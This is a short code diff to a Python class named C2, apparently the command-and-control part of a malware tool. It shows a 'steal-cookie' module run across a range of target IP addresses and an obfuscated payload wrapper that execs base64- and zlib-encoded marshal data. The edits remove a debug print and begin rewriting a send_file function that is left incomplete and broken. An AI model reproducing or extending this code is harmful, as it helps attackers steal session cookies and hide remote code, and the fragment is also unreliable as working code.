@@ -111,7 +111,6 @@ class C2:
         ip_range = data['ip']
 
         ip_addresses = self.parce_ip(ip_range)
-        print(ip_addresses)
 
         if explotation_module_type == "steal-cookie":
             for ip in ip_addresses:
@@ -189,5 +188,8 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
     
 
 
-    def send_file(ip):
-        print(ip)
+    def send_file(data):
+        ip_range = data['ip']
+        ip_addresses = self.parce_ip(ip_range)
+
+
